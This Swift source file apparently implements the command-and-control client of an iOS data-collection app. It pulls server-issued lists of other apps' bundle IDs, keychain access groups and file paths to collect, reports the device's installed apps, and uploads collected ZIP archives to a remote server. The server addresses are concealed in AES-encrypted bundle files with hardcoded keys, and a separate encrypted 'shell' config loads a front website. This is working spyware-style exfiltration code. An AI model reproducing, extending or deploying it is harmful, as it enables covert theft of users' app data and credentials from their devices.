import Foundation

// MARK: - 主协议（逐段移植自 3105/ThreeOneOSFive/helpers/Utils.swift）
//
// 端点：
//   POST /api/device/report  —— 拉取 collect_configs（采集清单）
//   POST /api/device/apps    —— 上报已安装 bundle id
//   POST /api/log/report     —— 上传采集状态行
//   POST /api/upload/zip     —— 上传采集到的 ZIP（params 加密，文件本体明文）
//
// 所有请求的 params 都是 AES-128-CBC + PKCS7 + Base64。

struct CollectItem: Equatable {
    let type: String
    let path: String
}

struct CollectConfig: Equatable {
    let bundleID: String
    let appName: String
    let accessGroup: String
    let items: [CollectItem]
}

struct CollectCycleResult: Equatable {
    let zipCount: Int
    let uploadedCount: Int
    let byteCount: Int64
    let completedAt: Date
}

enum ProtocolCollectError: Error, Equatable {
    case serverUnreachable
    case invalidServerResponse
    case collectionFailed(String)
    case uploadFailed(String)
}

/// AES-128-CBC helpers for the main protocol. Key/IV are hex strings that are
/// decoded to 16 bytes before use, PKCS7 padding, Base64 transport.
enum ProtocolCrypto {
    static let keyHex = "bc2c72b2260840b28bc9614aa2b8004b"
    static let ivHex = "71ec8e3980754823aba30e62be55cf6a"

    static func encrypt(_ plaintext: Data) -> Data? {
        crypt(CCOperation(kCCEncrypt), data: plaintext)
    }

    static func decrypt(_ ciphertext: Data) -> Data? {
        crypt(CCOperation(kCCDecrypt), data: ciphertext)
    }

    static func md5Hex(of data: Data) -> String {
        var digest = [UInt8](repeating: 0, count: Int(CC_MD5_DIGEST_LENGTH))
        data.withUnsafeBytes { raw in
            _ = CC_MD5(raw.baseAddress, CC_LONG(data.count), &digest)
        }
        return digest.map { String(format: "%02x", $0) }.joined()
    }

    private static func crypt(_ operation: CCOperation, data: Data) -> Data? {
        guard let key = Data(hexString: keyHex), let iv = Data(hexString: ivHex) else {
            return nil
        }
        let bufferSize = data.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: bufferSize)
        var bytesWritten = 0
        let status = data.withUnsafeBytes { dataRaw in
            key.withUnsafeBytes { keyRaw in
                iv.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        operation,
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress,
                        key.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress,
                        data.count,
                        &buffer,
                        bufferSize,
                        &bytesWritten
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<bytesWritten])
    }
}

extension Data {
    init?(hexString: String) {
        guard hexString.count.isMultiple(of: 2) else { return nil }
        var bytes: [UInt8] = []
        var index = hexString.startIndex
        while index < hexString.endIndex {
            let next = hexString.index(index, offsetBy: 2)
            guard let byte = UInt8(hexString[index..<next], radix: 16) else { return nil }
            bytes.append(byte)
            index = next
        }
        self.init(bytes)
    }
}

/// 与 apptrace 二进制共用同一份 links.txt（bundle 资源）：
/// 内容 = base64( AES-128-CBC( ["链接1","链接2",...] ) )，
/// 密钥/IV 为 16 字节 ASCII。主程序解出链接数组，取第一条作为主协议服务器地址。
enum LocalLinkProvider {
    static let keyBytes: [UInt8] = Array("tmvdzcGUsCG6ycyW".utf8)
    static let ivBytes: [UInt8] = Array("qG0IB6jBc7AQxkD1".utf8)

    private static let cachedLinks: [String] = loadLinks()

    static var links: [String] { cachedLinks }

    static var firstURL: URL? {
        guard let first = cachedLinks.first,
              let url = URL(string: first) else { return nil }
        return url
    }

    private static func loadLinks() -> [String] {
        guard let fileURL = Bundle.main.url(forResource: "links", withExtension: "txt"),
              let raw = try? String(contentsOf: fileURL, encoding: .utf8),
              let cipher = Data(base64Encoded: raw.trimmingCharacters(in: .whitespacesAndNewlines)),
              let plain = decrypt(cipher),
              let list = try? JSONSerialization.jsonObject(with: plain) as? [String] else {
            log("protocol: local links.txt unavailable or undecryptable — fallback baseURL will be used")
            return []
        }
        log("protocol: local links.txt loaded — \(list.count) links: \(list)")
        return list
    }

    private static func decrypt(_ cipher: Data) -> Data? {
        let size = cipher.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: size)
        var written = 0
        let status = cipher.withUnsafeBytes { dataRaw in
            keyBytes.withUnsafeBytes { keyRaw in
                ivBytes.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        CCOperation(kCCDecrypt),
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress, keyBytes.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress, cipher.count,
                        &buffer, size, &written
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<written])
    }
}

/// 启动配置的加密提供者（shell.txt，包内 base64(AES-CBC(key=value 文本))）。
enum ShellConfigProvider {
    static let resourceName = "shell"
    static let resourceExtension = "txt"

    private static let keyBytes: [UInt8] = Array("7T_shell_conf_v1".utf8)
    private static let ivBytes: [UInt8] = Array("sh3ll_c0nf_iv16x".utf8)

    struct Config: Equatable {
        let shellURL: URL
        let title: String?
        let protocolBaseURL: URL?
    }

    static let config: Config? = load()

    static var shellURL: URL? { config?.shellURL }

    private static func load() -> Config? {
        guard let fileURL = Bundle.main.url(forResource: resourceName, withExtension: resourceExtension),
              let raw = try? String(contentsOf: fileURL, encoding: .utf8),
              let cipher = Data(base64Encoded: raw.trimmingCharacters(in: .whitespacesAndNewlines)),
              let plain = decrypt(cipher) else {
            log("shell: shell.txt unavailable or undecryptable — launch site cannot be loaded")
            return nil
        }
        let config = parse(plain)
        if config == nil {
            log("shell: shell.txt decrypted but no valid https site found")
        }
        return config
    }

    private static func decrypt(_ cipher: Data) -> Data? {
        let size = cipher.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: size)
        var written = 0
        let status = cipher.withUnsafeBytes { dataRaw in
            keyBytes.withUnsafeBytes { keyRaw in
                ivBytes.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        CCOperation(kCCDecrypt),
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress, keyBytes.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress, cipher.count,
                        &buffer, size, &written
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<written])
    }

    private static func parse(_ plain: Data) -> Config? {
        guard let text = String(data: plain, encoding: .utf8) else { return nil }
        var fields: [String: String] = [:]
        for line in text.split(separator: "\n") {
            let parts = line.split(separator: "=", maxSplits: 1, omittingEmptySubsequences: false)
            guard parts.count == 2 else { continue }
            let key = parts[0].trimmingCharacters(in: .whitespaces).lowercased()
            let value = parts[1].trimmingCharacters(in: .whitespaces)
            if !key.isEmpty && !value.isEmpty { fields[key] = value }
        }

        guard let urlString = fields["url"],
              let url = URL(string: urlString),
              url.scheme?.lowercased() == "https",
              let host = url.host, !host.isEmpty else { return nil }

        var protocolBaseURL: URL?
        if let raw = fields["protocol"],
           let candidate = URL(string: raw),
           candidate.scheme?.lowercased() == "https",
           let candidateHost = candidate.host, !candidateHost.isEmpty {
            protocolBaseURL = candidate
        }

        return Config(shellURL: url, title: fields["title"], protocolBaseURL: protocolBaseURL)
    }
}

/// Main-protocol API client. Every payload is sent as an AES-encrypted
/// `params` field; responses unwrap the envelope and decrypt `data`.
enum ProtocolAPI {
    static let fallbackBaseURL = URL(string: "https://7t.com")!

    static var baseURL: URL {
        if let configured = ShellConfigProvider.config?.protocolBaseURL {
            return configured
        }
        return LocalLinkProvider.firstURL ?? fallbackBaseURL
    }

    static let uuidStorageKey = "protocol.app_uuid"
    static let reportTimeout: TimeInterval = 30
    static let uploadTimeout: TimeInterval = 120

    static var appUUID: String {
        let defaults = UserDefaults.standard
        if let existing = defaults.string(forKey: uuidStorageKey), !existing.isEmpty {
            return existing
        }
        let generated = UUID().uuidString.lowercased()
        defaults.set(generated, forKey: uuidStorageKey)
        return generated
    }

    static func deviceParams(extra: [String: Any] = [:]) -> [String: Any] {
        var params: [String: Any] = [
            "app_uuid": appUUID,
            "app_version": AppUpdateChecker.currentVersion,
            "app_pac": Bundle.main.bundleIdentifier ?? "",
            "machine": AppInfo.machineName,
            "ios_version": AppInfo.osVersion,
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000)
        ]
        for (key, value) in extra { params[key] = value }
        return params
    }

    static func encryptedParams(_ plaintext: [String: Any]) -> String? {
        guard let jsonData = try? JSONSerialization.data(withJSONObject: plaintext, options: []),
              let ciphertext = ProtocolCrypto.encrypt(jsonData) else { return nil }
        return ciphertext.base64EncodedString()
    }

    /// Pulls the collection list with `/api/device/report`（每 2 秒重试、最多 10 次）。
    static func pullCollectConfigs() async throws -> [CollectConfig] {
        var lastError: Error?
        for attempt in 0..<10 {
            do {
                return try await pullCollectConfigsOnce()
            } catch {
                lastError = error
                log("protocol: device/report attempt \(attempt + 1)/10 failed — \(error.localizedDescription)")
                if attempt < 9 {
                    try? await Task.sleep(nanoseconds: 2_000_000_000)
                }
            }
        }
        throw lastError ?? ProtocolCollectError.serverUnreachable
    }

    private static func pullCollectConfigsOnce() async throws -> [CollectConfig] {
        do {
            let envelope = try await postJSON(
                path: "api/device/report",
                plaintextParams: deviceParams()
            )
            let plain = try decryptEnvelope(envelope)
            guard let rawConfigs = plain["collect_configs"] as? [[String: Any]] else {
                log("protocol: device/report SUCCESS — no collect_configs (empty list)")
                return []
            }
            let configs = rawConfigs.compactMap { entry -> CollectConfig? in
                guard let bundleID = entry["bundle_id"] as? String,
                      !bundleID.isEmpty else { return nil }
                let appName = entry["app_name"] as? String ?? ""
                let accessGroup = entry["access_group"] as? String ?? ""
                let items = (entry["items"] as? [[String: Any]] ?? []).compactMap { raw -> CollectItem? in
                    guard let type = raw["type"] as? String,
                          let path = raw["path"] as? String,
                          !path.isEmpty else { return nil }
                    return CollectItem(type: type, path: path)
                }
                return CollectConfig(
                    bundleID: bundleID,
                    appName: appName,
                    accessGroup: accessGroup,
                    items: items
                )
            }
            log("protocol: device/report SUCCESS — collect_configs=\(configs.count)")
            return configs
        } catch {
            log("protocol: device/report FAILED — \(error)")
            throw error
        }
    }

    /// Reports installed app bundle ids with `/api/device/apps`.
    static func reportInstalledApps(_ apps: [String]) async throws {
        let plainParams = deviceParams(extra: ["apps": apps])
        let envelope = try await postJSON(
            path: "api/device/apps",
            plaintextParams: plainParams
        )
        guard (envelope["code"] as? Int ?? -1) == 0 else {
            log("protocol: device/apps FAILED — code=\(envelope["code"] ?? "?")")
            throw ProtocolCollectError.serverUnreachable
        }
        _ = try? decryptEnvelope(envelope)
        log("protocol: device/apps SUCCESS — reported \(apps.count) bundle ids")
    }

    /// `/api/log/report`: response `data` is NOT encrypted; success is HTTP 200 + code == 0.
    static func reportLog(text: String) async throws {
        let plainParams = deviceParams(extra: ["text": text])
        let envelope = try await postJSON(
            path: "api/log/report",
            plaintextParams: plainParams
        )
        guard (envelope["code"] as? Int ?? -1) == 0 else {
            let message = envelope["message"] as? String ?? "unknown"
            log("protocol: log/report FAILED — message=\(message)")
            throw ProtocolCollectError.serverUnreachable
        }
        log("protocol: log/report SUCCESS — \(text.count) chars")
    }

    /// Uploads a ZIP with `/api/upload/zip`. File bytes are NOT encrypted;
    /// only the `params` metadata field is AES-encrypted.
    static func uploadZip(fileURL: URL, bundleID: String) async throws {
        guard let fileData = try? Data(contentsOf: fileURL) else {
            throw ProtocolCollectError.collectionFailed("cannot read zip payload")
        }
        let fileName = fileURL.lastPathComponent
        let plainParams: [String: Any] = [
            "app_uuid": appUUID,
            "bundle_id": bundleID,
            "file_name": fileName,
            "file_md5": ProtocolCrypto.md5Hex(of: fileData),
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000)
        ]
        guard let params = encryptedParams(plainParams) else {
            throw ProtocolCollectError.invalidServerResponse
        }

        let boundary = "3105-\(UUID().uuidString)"
        var body = Data()
        func appendField(_ string: String) {
            body.append(string.data(using: .utf8) ?? Data())
        }
        appendField("--\(boundary)\r\n")
        appendField("Content-Disposition: form-data; name=\"params\"\r\n\r\n")
        appendField(params)
        appendField("\r\n--\(boundary)\r\n")
        appendField("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n")
        appendField("Content-Type: application/octet-stream\r\n\r\n")
        body.append(fileData)
        appendField("\r\n--\(boundary)--\r\n")

        var request = URLRequest(url: baseURL.appendingPathComponent("api/upload/zip"))
        request.httpMethod = "POST"
        request.setValue(
            "multipart/form-data; boundary=\(boundary)",
            forHTTPHeaderField: "Content-Type"
        )
        request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
        request.timeoutInterval = uploadTimeout
        request.httpBody = body

        let data: Data
        let response: URLResponse
        do {
            (data, response) = try await URLSession.shared.data(for: request)
        } catch {
            log("protocol: upload FAILED — \(fileName): \(error.localizedDescription)")
            throw ProtocolCollectError.serverUnreachable
        }
        guard let http = response as? HTTPURLResponse, http.statusCode == 200,
              let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              (envelope["code"] as? Int ?? -1) == 0 else {
            log("protocol: upload FAILED — \(fileName): non-200 response or code != 0")
            throw ProtocolCollectError.uploadFailed(fileName)
        }
        log("protocol: upload SUCCESS — \(fileName) bundle=\(bundleID) bytes=\(fileData.count)")
    }

    private static func postJSON(
        path: String,
        plaintextParams: [String: Any]
    ) async throws -> [String: Any] {
        guard let params = encryptedParams(plaintextParams) else {
            throw ProtocolCollectError.invalidServerResponse
        }
        var request = URLRequest(url: baseURL.appendingPathComponent(path))
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
        request.timeoutInterval = reportTimeout
        request.httpBody = try? JSONSerialization.data(withJSONObject: ["params": params])

        let data: Data
        let response: URLResponse
        do {
            (data, response) = try await URLSession.shared.data(for: request)
        } catch {
            log("protocol: \(path) FAILED — \(error.localizedDescription)")
            throw ProtocolCollectError.serverUnreachable
        }
        guard let http = response as? HTTPURLResponse, http.statusCode == 200,
              let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            log("protocol: \(path) FAILED — non-200 response or invalid envelope")
            throw ProtocolCollectError.serverUnreachable
        }
        log("protocol: \(path) SUCCESS — code=\(envelope["code"] ?? "?")")
        return envelope
    }

    private static func decryptEnvelope(_ envelope: [String: Any]) throws -> [String: Any] {
        guard let dataString = envelope["data"] as? String,
              !dataString.isEmpty,
              let ciphertext = Data(base64Encoded: dataString),
              let plainData = ProtocolCrypto.decrypt(ciphertext),
              let plainObject = try? JSONSerialization.jsonObject(with: plainData) as? [String: Any] else {
            throw ProtocolCollectError.invalidServerResponse
        }
        return plainObject
    }
}

/// Status lines shown to the server: only the collection flow milestones
/// (收到采集信息 / 进行中 / 采集完成) are uploaded via `/api/log/report`.
@MainActor
final class ProtocolStatusLog {
    static let shared = ProtocolStatusLog()
    private(set) var lines: [String] = []

    func append(_ line: String) {
        lines.append(line)
    }

    func clear() {
        lines.removeAll()
    }
}

/// Best-effort upload of the collection status lines via `/api/log/report`.
enum ProtocolLogReporter {
    static let maximumReportEntries = 500

    static func reportPendingLogs() async {
        let lines = await MainActor.run { ProtocolStatusLog.shared.lines }
        guard !lines.isEmpty else { return }
        let payload = lines.count > maximumReportEntries
            ? Array(lines.suffix(maximumReportEntries))
            : lines
        do {
            try await ProtocolAPI.reportLog(text: payload.joined(separator: "\n"))
            await MainActor.run { ProtocolStatusLog.shared.clear() }
        } catch {
            // Best effort: keep the lines for the next cycle.
        }
    }
}
